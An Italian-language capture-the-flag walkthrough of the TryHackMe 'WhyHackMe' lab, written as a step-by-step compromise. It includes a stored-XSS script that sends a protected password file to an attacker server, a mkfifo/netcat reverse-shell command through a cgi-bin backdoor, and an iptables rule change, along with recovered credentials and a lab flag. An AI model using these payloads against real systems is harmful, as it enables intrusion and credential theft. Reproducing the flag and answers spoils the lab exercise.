#tryhackmelabs 

https://tryhackme.com/room/whyhackme

```
nmap -Pn -v -p- 10.81.178.244
```
```
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http
41312/tcp filtered unknown
```
proviamo un accesso anonimo ftp
```
ftp 10.81.178.244
```
```
anonymous
```
```
ls -al
```

```
get update.txt
```
```
exit
```
scarichiamo il file e lo leggiamo
```
cat get update.txt
```

```
cat: get: No such file or directory
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

Facciamo un pò di Enumerazione
```
dirb http://10.81.178.244/ /usr/share/wordlists/dirb/common.txt
```
```
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.81.178.244/ ----
==> DIRECTORY: http://10.81.178.244/assets/                                                                                                                                                        
+ http://10.81.178.244/cgi-bin/ (CODE:403|SIZE:278)                                                                                                                                                
+ http://10.81.178.244/dir (CODE:403|SIZE:278)                                                                                                                                                     
+ http://10.81.178.244/index.php (CODE:200|SIZE:563)                                                                                                                                               
+ http://10.81.178.244/server-status (CODE:403|SIZE:278)                                                                                                                                           
                                                                                                                                                                                                   
---- Entering directory: http://10.81.178.244/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Dec 16 11:00:47 2025
DOWNLOADED: 4612 - FOUND: 4

```

```
dirb http://10.81.178.244/ /usr/share/wordlists/dirb/common.txt -X .txt,.php
```

```
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.81.178.244/ ----
+ http://10.81.178.244/blog.php (CODE:200|SIZE:3102)                                                                                                                                               
+ http://10.81.178.244/config.php (CODE:200|SIZE:0)                                                                                                                                                
+ http://10.81.178.244/index.php (CODE:200|SIZE:563)                                                                                                                                               
+ http://10.81.178.244/login.php (CODE:200|SIZE:523)                                                                                                                                               
+ http://10.81.178.244/logout.php (CODE:302|SIZE:0)                                                                                                                                                
+ http://10.81.178.244/register.php (CODE:200|SIZE:643)      
```


```
http://10.81.178.244/register.php
```
Creiamo una nuova registrazione 
ed entriamo nel blog

```
http://10.81.178.244/blog.php
```
proviamo un XSS
```
<script>alert()</script>
```
nulla da fare

proviamo a registrare un nuovo utente come 
```
<script>alert()</script>
```
nella speranza che sia visibile e sfruttabile

ora entriamo e proviamo a pubblicare qualsiasi cosa
```
test di prova
```
en ecco che appare l'Alert quindi XSS funziona!

proviamo ora a rubare i cookie di sessione registrando un nuovo utente ma non funziona

dobbiamo accedere in qualche modo al file pass.txt

creiamo uno script per farci inviare il file dal browser dell'amministratore
```
nano exfil.js
```
```
fetch('http://127.0.0.1/dir/pass.txt')
  .then(response => response.text())
  .then(data => {
    let attackerServer = 'http://ATTACK_IP:8000/catch?data=' + encodeURIComponent(data);
    // Use an Image tag for GET request
    let img = document.createElement('img');
    img.src = attackerServer;
    document.body.appendChild(img);
  });
```
questo sarà accessibile tramite il seguente server python
```
python3 -m http.server 8000
```
registriamo un nuovo utente come
```
<script src=http://192.168.188.60:8000/exfil.js></script>
```
accediamo e facciamo un post

riceveremo sul server una voce simile a questa
```
"GET /catch?data=jack%REDACTED%0A HTTP/1.1" 404 -
```

decodificare il valore di **data** utilizzando un decodificatore URL
ed otterremo user e password

```
jack:WhyIsMyPasswordSoStrongIDK
```

```
ssh jack@10.81.178.244
```

```
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat user.txt
1ca4eb201787acbfcf9e70fca87b866a
jack@ubuntu:~$ 
```

ora dobbiamo scalare i privilegi

trofiamo dei files interessanti in
```
jack@ubuntu:~$ cd /opt
jack@ubuntu:/opt$ ls
capture.pcap  urgent.txt
jack@ubuntu:/opt$ cat urgent.txt
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
jack@ubuntu:/opt$ 

```
 fornisce informazioni su dove sono stati posizionati alcuni file e sul fatto che tali file non sono accessibili a causa di alcune regole impostate in iptable
 
vediamo se è disponibile python sulla macchina vittima
```
python3 --version
```

```
jack@ubuntu:/opt$ python3 --version
Python 3.8.10
```

possiamo creare un server e trasferire il file capture.cap sulla nostro pc

```
python3 -m http.server 9000
```

apriamo il file
```
8	0.005803	10.133.71.33	10.13.64.69	TLSv1.2	664	Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
```
e **le informazioni che attraversano il traffico sono crittografate utilizzando il protocollo TLSv1.2**

dovremmo trovare la chiave per decifrare il traffico

**la maggior parte dei server web Apache conservano le loro chiavi nel**

`/etc/apache2/certs/apache.key`da`/etc/apache2/sites-enabled/000-default.conf`

```
cat /etc/apache2/certs/apache.key
```

```
-----BEGIN PRIVATE KEY-----
xxxxxxxxxxxxxxx
-----END PRIVATE KEY-----

```

quindi importiamo la chiave in Wireshark andando su Modifica>Preferenze>Protocolli>TLS

ora dobbiamo filtrare i pacchetti per http

 gli aggressori stavano cercando di accedere a "/cgi-bin/5UP3r5#Cr37.py"

```
sudo /usr/sbin/iptables -I INPUT -p tcp --dport 4132 -j ACCEPT
```

ora abbiamo accettato il traffico su quella porta

possiamo tentare un RCE utilizzando la stessa richiesta degli aggressori

```
curl -k -s 'https://10.81.178.244:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.188.60 443 >/tmp/f'
```


```
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

```
sudo su
```

```
cat root.txt
```
```
xxxxxxxxxxxxxxx
```

